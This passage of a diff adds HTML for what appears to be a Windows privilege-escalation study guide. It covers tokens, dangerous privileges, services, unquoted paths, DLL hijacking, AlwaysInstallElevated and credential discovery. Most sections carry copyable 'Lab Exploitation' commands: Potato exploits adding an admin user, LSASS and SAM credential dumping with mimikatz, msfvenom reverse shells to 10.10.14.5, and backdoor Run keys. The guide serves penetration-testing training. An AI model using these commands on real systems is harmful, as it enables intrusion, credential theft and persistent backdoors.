+          <p>Use built-in commands (<code>whoami</code>, <code>systeminfo</code>, <code>sc</code>, <code>schtasks</code>, <code>icacls</code>) and PowerShell.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Immediately after getting a shell.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">whoami</span>
+<span class="cmd">whoami /priv</span>
+<span class="cmd">whoami /groups</span>
+<span class="cmd">systeminfo</span>
+<span class="cmd">net user</span>
+<span class="cmd">net localgroup</span>
+<span class="cmd">net localgroup administrators</span>
+<span class="cmd">ipconfig /all</span>
+<span class="cmd">netstat -ano</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS TOKENS ==================== -->
+    <section class="section" id="win-tokens">
+      <h2>🎫 Windows — Tokens & Impersonation</h2>
+
+      <div class="section-intro">
+        <strong>Tokens are the currency of Windows privilege.</strong> Every process runs with a token. Every thread can impersonate. Understanding this chain is the key to Windows PrivEsc.
+      </div>
+
+      <div class="flow">
+        <span class="step">User</span>
+        <span class="arrow">→</span>
+        <span class="step">Access Token</span>
+        <span class="arrow">→</span>
+        <span class="step">Process</span>
+        <span class="arrow">→</span>
+        <span class="step">Thread</span>
+        <span class="arrow">→</span>
+        <span class="step">Impersonation Token</span>
+        <span class="arrow">→</span>
+        <span class="step">Security Context</span>
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">Primary Token</span>
+          <p>Assigned to a process at creation. Defines the process's default security context.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">Impersonation Token</span>
+          <p>Assigned to a thread. Allows a thread to temporarily run as another user.</p>
+        </div>
+        <div class="why-card">
+          <span class="label blue">Impersonation Levels</span>
+          <p>Anonymous, Identify, Impersonate, Delegate — control how far the impersonation goes.</p>
+        </div>
+        <div class="why-card">
+          <span class="label purple">Integrity Levels</span>
+          <p>Low, Medium, High, System — access control beyond ACLs.</p>
+        </div>
+      </div>
+
+      <h3>Why <code>SeImpersonatePrivilege</code> matters</h3>
+      <p>If a service runs with this privilege and you can make it connect to a malicious service you control, you can capture its token — potentially SYSTEM. Tools like Juicy Potato, PrintSpoofer, and RoguePotato exploit this.</p>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">whoami /priv</span>  <span class="comment"># Look for SeImpersonatePrivilege</span>
+<span class="cmd">whoami /all</span>   <span class="comment"># Full token info including integrity level</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Your token has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege<br>
+        <span class="ok">[✓]</span> A privileged service (SYSTEM) will connect to a listener you control<br>
+        <span class="ok">[✓]</span> You can host a malicious RPC/HTTP/COM service<br>
+        <span class="ok">[✓]</span> Compatible exploit for your Windows version (Potato family varies)<br>
+        <span class="ok">[✓]</span> No AppContainer or restricted token blocking you
+      </div>
+
+      <h4>Detection Perspective</h4>
+      <div class="detection-box">
+        <div class="detect-card red">
+          <span class="hdr">🔴 Attacker sees</span>
+          <code>SeImpersonatePrivilege</code> in <code>whoami /priv</code>.
+        </div>
+        <div class="detect-card blue">
+          <span class="hdr">🔵 Defender sees</span>
+          SYSTEM process creating a connection to a non-standard listener (e.g., <code>127.0.0.1:9999</code>). Event ID 4624 with unusual logon type.
+        </div>
+        <div class="detect-card green">
+          <span class="hdr">🟢 Mitigation</span>
+          Remove unnecessary SeImpersonatePrivilege from service accounts. Patch. Use AppContainer isolation.
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — SeImpersonatePrivilege (Potato Family)</h5>
+        <p>If you have <code>SeImpersonatePrivilege</code> and a privileged service will connect to a listener you control:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Transfer the appropriate Potato exploit to the target</span>
+<span class="comment">#    - JuicyPotato (older Windows)</span>
+<span class="comment">#    - PrintSpoofer (Win10 / Server 2016+)</span>
+<span class="comment">#    - RoguePotato (modern replacement)</span>
+<span class="comment">#    - GodPotato (recent versions)</span>
+
+<span class="comment"># 2. Example: PrintSpoofer to get SYSTEM</span>
+<span class="cmd">PrintSpoofer.exe -i -c "cmd /c whoami"</span>
+<span class="cmd">PrintSpoofer.exe -i -c "cmd /c net user hacker Passw0rd! /add && net localgroup administrators hacker /add"</span>
+
+<span class="comment"># 3. Example: GodPotato (works on most modern Windows)</span>
+<span class="cmd">GodPotato.exe -cmd "cmd /c whoami"</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS PRIVILEGES ==================== -->
+    <section class="section" id="win-privileges">
+      <h2>⚔️ Windows — Dangerous Privileges</h2>
+
+      <div class="section-intro">
+        <strong>Privileges are the sharp edges of Windows.</strong> Most aren't dangerous by themselves — but in the wrong hands, with the right technique, they cross a boundary.
+      </div>
+
+      <table>
+        <tr><th>Privilege</th><th>What it is</th><th>Risk</th><th>Reliability</th></tr>
+        <tr><td><code>SeImpersonatePrivilege</code></td><td>Impersonate another user's token</td><td>Juicy Potato, PrintSpoofer, RoguePotato</td><td>🟡</td></tr>
+        <tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Assign primary token to a process</td><td>Similar to above</td><td>🟡</td></tr>
+        <tr><td><code>SeBackupPrivilege</code></td><td>Bypass ACLs to read files</td><td>Read SAM/SYSTEM hives</td><td>🟢</td></tr>
+        <tr><td><code>SeRestorePrivilege</code></td><td>Bypass ACLs to write files</td><td>Overwrite privileged binaries</td><td>🟢</td></tr>
+        <tr><td><code>SeDebugPrivilege</code></td><td>Debug processes</td><td>Dump LSASS credentials</td><td>🟢</td></tr>
+        <tr><td><code>SeTakeOwnershipPrivilege</code></td><td>Take ownership of objects</td><td>Own and modify protected files</td><td>🟢</td></tr>
+        <tr><td><code>SeLoadDriverPrivilege</code></td><td>Load kernel drivers</td><td>Load malicious driver</td><td>🔴</td></tr>
+      </table>
+
+      <div class="callout warn">
+        <strong>Having a privilege does not automatically mean you can escalate.</strong> You need a compatible technique and often additional conditions.
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — SeBackupPrivilege (Read SAM/SYSTEM)</h5>
+        <p>If you have <code>SeBackupPrivilege</code>, you can copy the SAM and SYSTEM hives and extract local hashes:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">reg save hklm\sam C:\Temp\sam.hive</span>
+<span class="cmd">reg save hklm\system C:\Temp\system.hive</span>
+<span class="comment"># Then on attacker machine:</span>
+<span class="cmd">secretsdump.py -sam sam.hive -system system.hive LOCAL</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — SeDebugPrivilege (Dump LSASS)</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Using procdump (Sysinternals)</span>
+<span class="cmd">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span>
+<span class="comment"># Then extract with mimikatz:</span>
+<span class="cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — SeTakeOwnershipPrivilege</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Take ownership of a privileged file, then modify it</span>
+<span class="cmd">takeown /f "C:\Windows\System32\file.exe"</span>
+<span class="cmd">icacls "C:\Windows\System32\file.exe" /grant %USERNAME%:F</span>
+<span class="comment"># Now you can overwrite it</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — SeLoadDriverPrivilege</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Use the EoPLoadDriver or Capcom.sys exploit to load a malicious driver</span>
+<span class="comment"># Public PoC typically compiles a driver and loads it via NtLoadDriver</span>
+<span class="cmd">EoPLoadDriver.exe System\CurrentControlSet\MyDriver C:\path\to\driver.sys</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS SERVICES ==================== -->
+    <section class="section" id="win-services">
+      <h2>⚙️ Windows — Services</h2>
+      <span class="reliability rel-green">🟢 Reliable — if permissions are weak</span>
+
+      <div class="section-intro">
+        <strong>Services run as SYSTEM.</strong> If you can influence what a service runs, or how it runs, you can run code as SYSTEM.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Background processes managed by the Service Control Manager (SCM).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Services often run as SYSTEM. Writable binaries, directories, or configs are direct escalation paths.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>sc query</code>, <code>sc qc</code>, <code>accesschk</code>, <code>icacls</code>. For modern systems, use <code>Get-CimInstance</code> instead of deprecated <code>wmic</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Always — services are the #1 Windows PrivEsc vector.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">sc query state= all</span>
+<span class="cmd">sc qc &lt;service_name&gt;</span>  <span class="comment"># Query service config</span>
+<span class="cmd">Get-CimInstance Win32_Service | Select-Object Name, DisplayName, PathName, StartMode</span>  <span class="comment"># Modern replacement for wmic</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Service runs as SYSTEM or a privileged account<br>
+        <span class="ok">[✓]</span> Service binary or its directory is writable by your user<br>
+        <span class="ok">[✓]</span> OR the service path is unquoted with a writable earlier path<br>
+        <span class="ok">[✓]</span> OR the service configuration (registry) is writable<br>
+        <span class="ok">[✓]</span> You can restart the service or trigger it to restart
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable Service Binary</h5>
+        <p>If a service runs as SYSTEM and its binary is writable:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Replace the binary with a malicious one (e.g., reverse shell)</span>
+<span class="cmd">copy C:\Temp\shell.exe "C:\Program Files\Vuln Service\service.exe"</span>
+
+<span class="comment"># 2. Restart the service</span>
+<span class="cmd">sc stop VulnService</span>
+<span class="cmd">sc start VulnService</span>
+
+<span class="comment"># Your shell now runs as SYSTEM</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Writable Service Config (Registry)</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If you can write to the service's registry key</span>
+<span class="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\shell.exe" /f</span>
+<span class="cmd">sc stop VulnService</span>
+<span class="cmd">sc start VulnService</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Weak Service Permissions (sc config)</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If your user has SERVICE_CHANGE_CONFIG rights on a SYSTEM service</span>
+<span class="cmd">sc config VulnService binPath= "C:\Temp\shell.exe"</span>
+<span class="cmd">sc stop VulnService</span>
+<span class="cmd">sc start VulnService</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== UNQUOTED SERVICE PATH ==================== -->
+    <section class="section" id="win-unquoted">
+      <h2>📁 Windows — Unquoted Service Path</h2>
+      <span class="reliability rel-green">🟢 Reliable — if writable earlier path exists</span>
+
+      <div class="section-intro">
+        <strong>A space in a service path is a trust gap.</strong> Windows tries each space-separated possibility in order — and if you can write to an earlier one, you hijack the execution.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>A service path with spaces that isn't quoted, e.g., <code>C:\Program Files\Vuln Service\svc.exe</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Windows tries <code>C:\Program.exe</code> first, then <code>C:\Program Files\Vuln.exe</code>, etc. If you can write to an earlier path, your binary runs.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use PowerShell to find unquoted service paths (modern replacement for deprecated <code>wmic</code>).</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When you spot an unquoted path with spaces — always check writability.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | Select-Object Name, DisplayName, PathName, StartMode</span></pre>
+      </div>
+
+      <div class="callout warn">
+        <strong>Deprecation notice:</strong> The <code>wmic</code> utility is deprecated since Windows 10 21H1 and is being removed from newer Windows 11 versions. Use <code>Get-CimInstance</code> instead.
+      </div>
+
+      <div class="flow">
+        <span class="step">App</span>
+        <span class="arrow">→</span>
+        <span class="step">Search order</span>
+        <span class="arrow">→</span>
+        <span class="step">Expected path</span>
+        <span class="arrow">→</span>
+        <span class="step">Writable earlier path</span>
+        <span class="arrow">→</span>
+        <span class="step">Your binary runs</span>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Service path contains spaces<br>
+        <span class="ok">[✓]</span> Path is NOT quoted<br>
+        <span class="ok">[✓]</span> A directory earlier in the path is writable by you<br>
+        <span class="ok">[✓]</span> Service runs as SYSTEM or a privileged account<br>
+        <span class="ok">[✓]</span> Service restarts automatically or you can reboot
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Unquoted Service Path</h5>
+        <p>If a service path is unquoted and a writable directory exists earlier in the path:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Example path: C:\Program Files\Vuln Service\service.exe</span>
+<span class="comment"># Windows will try (in order):</span>
+<span class="comment">#   C:\Program.exe</span>
+<span class="comment">#   C:\Program Files\Vuln.exe</span>
+<span class="comment">#   C:\Program Files\Vuln Service\service.exe</span>
+
+<span class="comment"># 1. Check if C:\ is writable (usually not) — but check subdirs</span>
+<span class="cmd">icacls "C:\"</span>
+<span class="cmd">icacls "C:\Program Files"</span>
+<span class="cmd">icacls "C:\Program Files\Vuln Service"</span>
+
+<span class="comment"># 2. Drop a malicious binary at the earliest writable path</span>
+<span class="cmd">copy C:\Temp\shell.exe "C:\Program.exe"</span>
+<span class="comment"># OR</span>
+<span class="cmd">copy C:\Temp\shell.exe "C:\Program Files\Vuln.exe"</span>
+
+<span class="comment"># 3. Restart the service</span>
+<span class="cmd">sc stop VulnService</span>
+<span class="cmd">sc start VulnService</span>
+
+<span class="comment"># Your binary runs as SYSTEM</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS TASKS ==================== -->
+    <section class="section" id="win-tasks">
+      <h2>📅 Windows — Scheduled Tasks</h2>
+      <span class="reliability rel-green">🟢 Reliable — if task binary is writable</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Tasks run on a schedule by the Task Scheduler, often as SYSTEM.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Writable task executables or scripts let you run code in the task's security context.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>schtasks /query /fo LIST /v</code> — look for writable paths.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After services — tasks are a similar trust model.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">schtasks /query /fo LIST /v</span>
+<span class="cmd">schtasks /query /tn &lt;task_name&gt; /fo LIST /v</span></pre>
+      </div>
+      <p>Look for tasks running as SYSTEM with writable executables or scripts.</p>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable Scheduled Task Binary</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Identify a task running as SYSTEM whose executable is writable</span>
+<span class="cmd">schtasks /query /fo LIST /v | findstr /i "TaskName Run"</span>
+
+<span class="comment"># 2. Replace the executable with a malicious binary</span>
+<span class="cmd">copy C:\Temp\shell.exe "C:\Program Files\VulnTask\task.exe"</span>
+
+<span class="comment"># 3. Trigger the task</span>
+<span class="cmd">schtasks /run /tn "VulnTask"</span>
+
+<span class="comment"># Your shell runs as SYSTEM</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS PERMS ==================== -->
+    <section class="section" id="win-perms">
+      <h2>🔒 Windows — NTFS Permissions</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>NTFS ACLs define access. DACLs list who can do what; SACLs are for auditing.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Writable privileged files (e.g., service binaries, configs) allow code execution in a privileged context.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>icacls "C:\path\to\file"</code>, <code>accesschk</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Whenever a privileged process references a file you might control.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">icacls "C:\path\to\file"</span>
+<span class="cmd">accesschk.exe -uwcqv "Everyone" *</span>  <span class="comment"># Sysinternals</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Overwrite Privileged Binary</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If a SYSTEM service binary is writable by your user</span>
+<span class="cmd">copy C:\Temp\shell.exe "C:\Program Files\Vuln\service.exe"</span>
+<span class="cmd">sc stop VulnService</span>
+<span class="cmd">sc start VulnService</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS DLL ==================== -->
+    <section class="section" id="win-dll">
+      <h2>📚 Windows — DLL Hijacking</h2>
+      <span class="reliability rel-yellow">🟡 Environment-dependent — needs missing DLL + writable path</span>
+
+      <div class="section-intro">
+        <strong>DLL hijacking exploits the search order.</strong> If a program loads a DLL by name and Windows finds yours first, your code runs in that program's context.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Windows applications search for DLLs in a specific order of directories.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If a writable directory appears before the legitimate DLL location, you can place a malicious DLL with the expected name.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use Process Monitor (ProcMon) to see what a process loads and from where. Look for NAME NOT FOUND results in writable paths.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When a privileged process loads a DLL that doesn't exist in its expected location.</p>
+        </div>
+      </div>
+
+      <div class="callout">
+        <strong>Search order (simplified):</strong> Application directory → System directories → Windows directory → Current directory → PATH directories.
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Privileged process loads a DLL by name<br>
+        <span class="ok">[✓]</span> The DLL is missing from its expected location (ProcMon: NAME NOT FOUND)<br>
+        <span class="ok">[✓]</span> A directory earlier in the search order is writable by you<br>
+        <span class="ok">[✓]</span> The process runs as SYSTEM or a privileged account<br>
+        <span class="ok">[✓]</span> You can trigger the process to execute
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — DLL Search Order Hijack</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Identify a missing DLL via ProcMon (NAME NOT FOUND in a writable path)</span>
+<span class="comment"># 2. Create a malicious DLL with the same name</span>
+<span class="comment">#    A common DLL payload: run a reverse shell on DllMain</span>
+
+<span class="comment"># Example using msfvenom:</span>
+<span class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll</span>
+
+<span class="comment"># 3. Place hijack.dll in the writable search path</span>
+<span class="cmd">copy hijack.dll "C:\VulnerableApp\missing.dll"</span>
+
+<span class="comment"># 4. Trigger the privileged process</span>
+<span class="comment"># Your DLL loads as the process's user (often SYSTEM)</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS REGISTRY ==================== -->
+    <section class="section" id="win-registry">
+      <h2>📋 Windows — Registry</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>The Registry stores configuration for the OS, services, and applications.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Writable keys related to services, autoruns, or UAC can be abused to run code as SYSTEM.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>reg query</code>, <code>Get-ItemProperty</code>, <code>accesschk</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After services and tasks — registry is the next place to look for trust gaps.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Services</span>
+<span class="cmd">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Writable Autorun Registry Key</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If HKLM\...\Run is writable by your user</span>
+<span class="cmd">reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\shell.exe" /f</span>
+<span class="comment"># On next login or reboot, shell.exe runs as the logged-in user (or SYSTEM if it's a service context)</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== ALWAYS INSTALL ELEVATED ==================== -->
+    <section class="section" id="win-always">
+      <h2>⬆️ AlwaysInstallElevated</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>A group policy setting that allows any user to install MSI packages with SYSTEM privileges.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If both registry keys are set to 1, any user can install a malicious MSI as SYSTEM.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Query both <code>HKCU</code> and <code>HKLM</code> for <code>AlwaysInstallElevated</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>Not enabled by default. Both keys must be set to 1.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="cmd">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — AlwaysInstallElevated</h5>
+        <p>If both keys are set to 1, any MSI you build runs as SYSTEM:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. On attacker machine, build a malicious MSI with msfvenom</span>
+<span class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi</span>
+
+<span class="comment"># 2. Transfer to target and install</span>
+<span class="cmd">msiexec /quiet /qn /i C:\Temp\shell.msi</span>
+
+<span class="comment"># Your shell runs as SYSTEM</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS PIPES ==================== -->
+    <section class="section" id="win-pipes">
+      <h2>🔗 Windows — Named Pipes</h2>
+
+      <div class="section-intro">
+        <strong>Named pipes are a client-server communication channel.</strong> When a privileged service uses a pipe, and you can influence the server or client side, you may be able to impersonate the privileged side.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>A named pipe is a Windows IPC mechanism. One process creates a pipe (server), another connects (client).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If a privileged process connects to a pipe you control, you can capture its token via <code>ImpersonateNamedPipeClient</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use PipeList (Sysinternals) or <code>powershell Get-ChildItem \\.\pipe\</code> to enumerate pipes.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Advanced — when SeImpersonatePrivilege is present and a privileged service connects to pipes.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">Get-ChildItem \\.\pipe\</span>
+<span class="cmd">pip.exe</span>  <span class="comment"># Sysinternals PipeList</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A privileged service (SYSTEM) connects to a named pipe<br>
+        <span class="ok">[✓]</span> You can impersonate the pipe server or intercept the client<br>
+        <span class="ok">[✓]</span> Your token has SeImpersonatePrivilege<br>
+        <span class="ok">[✓]</span> The service connects periodically or on trigger<br>
+        <span class="ok">[✓]</span> No AppContainer isolation blocks the connection
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Named Pipe Impersonation</h5>
+        <p>If a privileged service connects to a pipe you control and you have SeImpersonatePrivilege:</p>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># The classic tool for this is "pipepotato" or similar PoCs</span>
+<span class="comment"># In a lab, transfer the compiled exploit and run it</span>
+<span class="cmd">pipepotato.exe -p "C:\Temp\shell.exe"</span>
+
+<span class="comment"># Or use the "RogueWinRM" style exploit if WinRM/BITS service is available</span>
+<span class="cmd">RogueWinRM.exe -p "C:\Temp\shell.exe" -a "-c"</span></pre>
+        </div>
+
+        <div class="callout warn">
+          <strong>Note:</strong> Named pipe impersonation requires SeImpersonatePrivilege. The specific exploit depends on which privileged service is available to connect to your pipe.
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== WINDOWS CREDENTIALS ==================== -->
+    <section class="section" id="win-credentials">
+      <h2>🔐 Windows — Credential Discovery</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Finding stored credentials, keys, or secrets on the system.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Credentials may allow login as another user with higher privileges.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Search configs, registry, files, and use <code>cmdkey /list</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Limitations</span>
+          <p>Credentials may be expired, invalid, or for another host.</p>
+        </div>
+      </div>
+
+      <ul>
+        <li>Configuration files (web.config, unattend.xml)</li>
+        <li>Registry (autologon, PuTTY, etc.)</li>
+        <li>Saved credentials (<code>cmdkey /list</code>)</li>
+        <li>Environment variables</li>
+        <li>Scripts and batch files</li>
+      </ul>
+
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">cmdkey /list</span>
+<span class="cmd">findstr /si password *.xml *.ini *.txt</span>
+<span class="cmd">reg query HKLM /f password /t REG_SZ /s</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Use Discovered Credentials</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If you find a password for an admin user:</span>
+<span class="cmd">runas /user:Administrator cmd.exe</span>
+<span class="comment"># Or use PsExec if the target has it:</span>
+<span class="cmd">PsExec.exe -u Administrator -p Password123 cmd.exe</span>
+
+<span class="comment"># If you find stored credentials from cmdkey:</span>
+<span class="comment"># Use "runas /savecred" to invoke them without knowing the password</span>
+<span class="cmd">runas /savecred /user:DOMAIN\Admin cmd.exe</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== POWERSHELL ==================== -->
+    <section class="section" id="win-powershell">
+      <h2>💻 PowerShell Enumeration</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>PowerShell provides object-based access to system information.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why useful</span>
+          <p>It can query almost anything — processes, services, users, registry, files — with consistent syntax.</p>
+        </div>
